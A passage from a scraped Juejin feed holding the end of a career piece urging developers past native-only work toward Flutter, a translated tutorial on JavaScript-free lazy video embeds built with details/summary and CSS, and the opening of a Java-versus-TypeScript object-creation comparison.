<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed67a001c10541e7a7b5eacd83040b21~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556840&amp;x-signature=XHKuTug%2BCYh2v8rTs%2Fcual4UDMY%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>你指望老板招 5 拨人去维护 5 套代码？</p>
<p>老板根本不在乎你用原生还是Flutter，老板只在乎能不能把团队裁到只有一个人，然后你把所有的工作搞定。</p>
<p>只会纯原生等于把自己锁死在一个平台上。</p>
<p>一旦那个平台没落了，或者公司业务调整不做了。</p>
<p>想想当年的塞班开发，甚至前几年的 Windows Phone 开发，是不是背脊发凉？</p>
<hr/>
<h2 data-id="heading-3">你是不是那个解决问题的人？</h2>
<p>其实不管是团队的技术方案选择，还是开发者个人技能树的升级，技术栈的选择从来都不仅仅是技术参数的对比。</p>
<p><strong>站在团队的角度</strong>，老刘当年选择Flutter的原因有以下几个方面：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/22fabffacbe9458eadf0143d7c58cc96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556840&amp;x-signature=6Tu8iY%2B0lQTxqiYxLzyvWmqvBEE%3D" alt="Mermaid Diagram" loading="lazy"/></p>
<p><strong>站在开发者个人的角度</strong>，你需要保证自己的技能树中点出来当前主流的技术方向。</p>
<p>我不是说一定要学Flutter或者某一个技术，而是你要知道现在在行业内大家都在用哪些技术。</p>
<p>而被大量企业和团队选择的技术栈大概率是当前最能解决实战问题的，或者是最具备性价比的选项。</p>
<p>为啥要做从众的选择？</p>
<p>因为商业社会你不能做那个掌握屠龙技的人，而要与做那个解决问题的人。</p>
<p>那什么样的技术路线能解决问题呢？</p>
<p>并不是你钻研最深入的，看起来参数最好的，而是你的同事都会用的。</p>
<p>不仅仅是你的同事，还是那些LLM比如Claude、ChatGPT甚至Kimi都能玩得转的。</p>
<hr/>
<h2 data-id="heading-4">换个活法，路宽得很</h2>
<p>我建议你放弃纯原生，不是让你忘掉基础。</p>
<p>而是让你放弃那种画地为牢的心态。</p>
<p>不要做一个只会砌墙的泥瓦匠，要做一个懂结构的建筑师。</p>
<p>未来属于那些<strong>站在原生肩膀上，用跨平台和 AI 俯视业务</strong>的开发者。</p>
<p>别让技术栈限制了你的想象力。</p>
<p>更别让纯原生限制了你的身价。</p>
<p>共勉。</p>
<blockquote>
<p>🤝 如果看到这里的同学对客户端或者Flutter开发感兴趣，欢迎联系老刘，我们互相学习。</p>
<p>🎁 私信免费领老刘整理的《Flutter开发手册》，覆盖90%应用开发场景。可以作为Flutter学习的知识地图。</p>
<p>💬 : laoliu_dev</p>
</blockquote>
<blockquote>
<p>📂 老刘也把自己历史文章整理在GitHub仓库里，方便大家查阅。
🔗 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flzt-code%2Fblog" target="_blank" title="https://github.com/lzt-code/blog" ref="nofollow noopener noreferrer">github.com/lzt-code/bl…</a></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[零 JavaScript 的性能优化视频嵌入]]></title>    <link>https://juejin.cn/post/7605807405307412543</link>    <guid>https://juejin.cn/post/7605807405307412543</guid>    <pubDate>2026-02-13T03:07:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605807405307412543" data-draft-id="7605941424535928886" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="零 JavaScript 的性能优化视频嵌入"/> <meta itemprop="keywords" content="前端,JavaScript,面试"/> <meta itemprop="datePublished" content="2026-02-13T03:07:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金安东尼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            零 JavaScript 的性能优化视频嵌入
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金安东尼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:07:56.000Z" title="Fri Feb 13 2026 03:07:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Ffrontendmasters.com%2Fblog%2Fperformance-optimized-video-embeds-with-zero-javascript%2F" target="_blank" title="https://frontendmasters.com/blog/performance-optimized-video-embeds-with-zero-javascript/" ref="nofollow noopener noreferrer">Performance-Optimized Video Embeds with Zero JavaScript</a></p>
<p>翻译：TUARAN</p>
<p>欢迎关注 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">{{前端周刊}}</a>，每周更新国外论坛的前端热门文章，紧跟时事，掌握前端技术动态。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9adab526bf35403b930731150fbe7285~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556876&amp;x-signature=qCH4PSQPzxnMqBljgE%2BTusLDBL4%3D" alt="image.png" loading="lazy"/></p>
<p>嵌入视频往往会显著拖慢页面：播放器会加载一堆额外资源，即使用户最终根本不点播放。</p>
<p>常见的优化是用 <code>lite-youtube-embed</code> 之类的轻量组件先占位、再按需加载。但如果视频就在首屏（above the fold），仍然可能因为占位与真实播放器尺寸/渲染时机问题带来 CLS（累计布局偏移）。</p>
<p>这篇文章给出一种“极简但很实用”的模式：只用原生 HTML 的 <code>&lt;details&gt;</code> / <code>&lt;summary&gt;</code> + 一点 CSS，实现<strong>交互时才加载 iframe</strong>，并且不写一行 JS。</p>
<h2 data-id="heading-0">解决方案：用 <code>&lt;details&gt;</code> / <code>&lt;summary&gt;</code> 作为交互边界</h2>
<p><code>&lt;summary&gt;</code> 的默认行为类似按钮：点击会展开对应 <code>&lt;details&gt;</code>，浏览器会给 <code>&lt;details&gt;</code> 加上 <code>open</code> 属性；再点一次就收起。</p>
<p>页面初始加载时，<code>&lt;details&gt;</code> 内除了 <code>&lt;summary&gt;</code> 以外的内容默认不显示——这使它天然适合“用户交互后才呈现”的内容（比如 iframe 视频）。</p>
<h2 data-id="heading-1">懒加载：要避免“首屏懒加载反伤”</h2>
<p>现代浏览器支持 <code>loading="lazy"</code> 对图片与 iframe 做原生懒加载。</p>
<p>但需要注意：把所有东西都懒加载，可能反而让 LCP 变差。Chrome 团队的研究提到，过度懒加载可能让 LCP 下降约 20%，尤其是当你把内容懒加载到首屏视口里时。</p>
<p>这里的关键点在于：iframe 视频作为 <code>&lt;details&gt;</code> 的内容，在用户点击之前并不算“初始视口内容”，所以不会触发那种“首屏懒加载带来的反效果”。</p>
<p>结论：如果你本来就把视频放在一个可折叠区域里（accordion），那就非常适合把它延迟到“用户想看”的那一刻才加载。</p>
<h2 data-id="heading-2">样式：把 <code>&lt;summary&gt;</code> 做成视频缩略图</h2>
<p>默认的 <code>&lt;details&gt;</code> 样式很朴素。我们可以把 <code>&lt;summary&gt;</code> 做成一个“视频缩略图占位”，上面叠一个自定义播放按钮。</p>
<pre><code class="hljs language-ini" lang="ini">&lt;details <span class="hljs-attr">class</span>=<span class="hljs-string">"video-embed"</span>&gt;
  &lt;summary <span class="hljs-attr">class</span>=<span class="hljs-string">"video-summary"</span> aria-label=<span class="hljs-string">"播放视频：Big Buck Bunny"</span>&gt;
    &lt;img
      <span class="hljs-attr">src</span>=<span class="hljs-string">"https://lab.n8d.studio/htwoo/htwoo-core/images/videos/big-bug-bunny.webp"</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"video-thumbnail"</span>
      <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
    /&gt;
    &lt;svg <span class="hljs-attr">class</span>=<span class="hljs-string">"video-playicon"</span> viewBox=<span class="hljs-string">"0 0 32 32"</span> aria-hidden=<span class="hljs-string">"true"</span>&gt;
      &lt;path <span class="hljs-attr">d</span>=<span class="hljs-string">"m11.167 5.608 16.278 8.47a2.169 2.169 0 0 1 .011 3.838l-.012.006-16.278 8.47a2.167 2.167 0 0 1-3.167-1.922V7.529a2.167 2.167 0 0 1 3.047-1.981l-.014-.005.134.065z"</span> /&gt;
    &lt;/svg&gt;
  &lt;/summary&gt;

  &lt;div <span class="hljs-attr">class</span>=<span class="hljs-string">"video-content"</span>&gt;
    &lt;!-- 原始 embed 代码尽量不改，直接放进来 --&gt;
    &lt;iframe
      <span class="hljs-attr">src</span>=<span class="hljs-string">"https://www.youtube.com/embed/aqz-KE-bpKQ?autoplay=1"</span>
      <span class="hljs-attr">title</span>=<span class="hljs-string">"Big Buck Bunny"</span>
      <span class="hljs-attr">loading</span>=<span class="hljs-string">"lazy"</span>
      <span class="hljs-attr">allow</span>=<span class="hljs-string">"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"</span>
      allowfullscreen
    &gt;&lt;/iframe&gt;
  &lt;/div&gt;
&lt;/details&gt;
</code></pre>
<p>要点：</p>
<ul>
<li>缩略图与 iframe 维持同一宽高比（避免布局跳动）。</li>
<li>播放按钮用自有 SVG，保证品牌一致性。</li>
<li><code>aria-label</code> 给屏幕阅读器一个明确的动作提示（作者也强调需要做跨 VoiceOver/NVDA/JAWS 的实际测试）。</li>
</ul>
<p>CSS 可以用 grid 把按钮叠在缩略图正中：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.video-summary</span> {
  <span class="hljs-attribute">display</span>: grid;
  place-items: center;
}

<span class="hljs-selector-class">.video-thumbnail</span>,
<span class="hljs-selector-class">.video-playicon</span> {
  <span class="hljs-attribute">grid-area</span>: <span class="hljs-number">1</span> / <span class="hljs-number">1</span>;
}

<span class="hljs-selector-class">.video-playicon</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">64px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">64px</span>;
}
</code></pre>
<h2 data-id="heading-3">展开后隐藏缩略图，让 iframe 出现</h2>
<p><code>&lt;summary&gt;</code> 默认即使展开也会持续可见；但我们展开后希望看到的是 iframe，而不是缩略图。</p>
<p>思路很简单：当 <code>&lt;details&gt;</code> 具备 <code>open</code> 属性时，把 summary 隐藏。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.video-embed</span> {
  <span class="hljs-attribute">position</span>: relative;
}

<span class="hljs-selector-class">.video-embed</span><span class="hljs-selector-attr">[open]</span> <span class="hljs-selector-class">.video-summary</span> {
  <span class="hljs-attribute">visibility</span>: hidden;
}

<span class="hljs-selector-class">.video-content</span> <span class="hljs-selector-tag">iframe</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
}
</code></pre>
<p>用户点击缩略图时：</p>
<ul>
<li>浏览器把 <code>open</code> 加到 <code>&lt;details&gt;</code> 上</li>
<li>summary 被隐藏</li>
<li>iframe 进入视口并开始加载（而且只在用户真的想看时才加载）</li>
</ul>
<p>小提示：对于 YouTube，可以在 iframe URL 上加 <code>?autoplay=1</code>，让播放器尽快开始播放；但如果用户浏览器禁用了 autoplay，仍需要再次点击。</p>
<h2 data-id="heading-4">性能对比（与 lite-youtube-embed）</h2>
<p>作者用同一张缩略图对比了本方案与 <code>lite-youtube-embed</code>：</p>





















































<table><thead><tr><th>指标</th><th><code>&lt;details&gt;</code> 模式</th><th>lite-youtube-embed</th><th>更优</th></tr></thead><tbody><tr><td>Load Time</td><td>595ms</td><td>693ms</td><td><code>&lt;details&gt;</code>（约快 14%）</td></tr><tr><td>FCP</td><td>11ms</td><td>70ms</td><td><code>&lt;details&gt;</code>（约快 6.4×）</td></tr><tr><td>LCP</td><td>97ms</td><td>157ms</td><td><code>&lt;details&gt;</code>（约快 1.6×）</td></tr><tr><td>Transfer</td><td>34 KB</td><td>84 KB</td><td><code>&lt;details&gt;</code>（约少 2.5×）</td></tr><tr><td>CLS</td><td>0.0075</td><td>0.0000</td><td>都不错</td></tr><tr><td>TBT</td><td>0ms</td><td>0ms</td><td>持平</td></tr><tr><td>JavaScript</td><td>0</td><td>~3KB</td><td><code>&lt;details&gt;</code></td></tr></tbody></table>
<p>（原文还提到资源请求数量也显著更少。）</p>
<h2 data-id="heading-5">收尾</h2>
<ul>
<li><code>&lt;details&gt;</code> 自 2011 起就在浏览器中可用</li>
<li>iframe 原生 lazy loading 大约在 2019 落地</li>
</ul>
<p>把两者结合起来，你就能获得“首屏更快、重内容延后、交互自然、键盘可用”的视频嵌入体验，而且完全不依赖 JavaScript。</p>
<p>它不是一个“产品”，而是一个“模式”：同样适用于 Vimeo、自托管视频、GIF、CodePen、地图等任何重量级嵌入内容。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[同一个 new，不同的世界：Java 与 TypeScript 对象创建机制的降维打击]]></title>    <link>https://juejin.cn/post/7605811866908524553</link>    <guid>https://juejin.cn/post/7605811866908524553</guid>    <pubDate>2026-02-13T02:49:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908524553" data-draft-id="7605817795628597298" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="同一个 new，不同的世界：Java 与 TypeScript 对象创建机制的降维打击"/> <meta itemprop="keywords" content="JavaScript,Java"/> <meta itemprop="datePublished" content="2026-02-13T02:49:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Gogo1121"/> <meta itemprop="url" content="https://juejin.cn/user/4162081326907051"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            同一个 new，不同的世界：Java 与 TypeScript 对象创建机制的降维打击
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4162081326907051/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Gogo1121
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T02:49:12.000Z" title="Fri Feb 13 2026 02:49:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>​</p>
<p>让我们先看两段代码。</p>
<p><strong>Java 代码：</strong></p>
<pre><code class="hljs language-ini" lang="ini">CountPointsTransactDto <span class="hljs-attr">record</span> = new CountPointsTransactDto()<span class="hljs-comment">;</span>
<span class="hljs-attr">record.amount</span> = <span class="hljs-number">100</span><span class="hljs-comment">;</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p><strong>TypeScript 代码：</strong></p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">record</span> = new CountPointsTransactDto()<span class="hljs-comment">;</span>
<span class="hljs-attr">record.amount</span> = <span class="hljs-number">100</span><span class="hljs-comment">;</span>
</code></pre>
<p><img src="%E8%BD%AC%E5%AD%98%E5%A4%B1%E8%B4%A5%EF%BC%8C%E5%BB%BA%E8%AE%AE%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E6%96%87%E4%BB%B6%20" alt="转存失败，建议直接上传图片文件" title="点击并拖拽以移动" loading="lazy"/></p>
<p>乍一看，这简直就是<strong>双胞胎</strong>。语法结构、关键字、甚至赋值方式都如出一辙。很多从 Java 转过来的后端同学看到这里会松一口气：“切，TS 不就是带类型的 JS 嘛，跟写 Java 没区别。”</p>
<p><strong>大错特错。</strong></p>
<p>虽然它们长得像，但在计算机内存的微观世界里，这两行代码触发的逻辑完全属于两个不同的宇宙。</p>
<hr/>
<h2 data-id="heading-0">🧊 一、内存模型：蓝图 vs 黏土</h2>
<h3 data-id="heading-1">1. Java 的 <code>new</code>：严格的蓝图 (Blueprint)</h3>
<p>在 Java 中，类（Class）是一张<strong>不可修改的工程蓝图</strong>。</p>
<p>当你执行 <code>new</code> 时，JVM 会做以下事情：</p>
<ol>
<li><strong>加载蓝图</strong>：读取 <code>.class</code> 文件，解析字段和方法。</li>
<li><strong>划地盘</strong>：根据蓝图计算出对象需要多少内存（例如：2个 int + 1个 String 引用 = 固定字节数）。</li>
<li><strong>浇筑</strong>：在堆内存中开辟一块<strong>固定大小、固定结构</strong>的区域。</li>
</ol>
<p><strong>结论</strong>：Java 对象出生那一刻，它的结构就定死了。你不可能在运行时突然给它加一个 <code>nickname</code> 属性。如果你敢这么做，编译器会直接报错，IDE 会标红。</p>
<h3 data-id="heading-2">2. TypeScript (JS) 的 <code>new</code>：可塑的黏土 (Clay)</h3>
<p>在 TypeScript（最终运行的是 JavaScript）中，类只是一个<strong>函数</strong>，对象只是一个<strong>哈希表（Key-Value Map）</strong> 。</p>
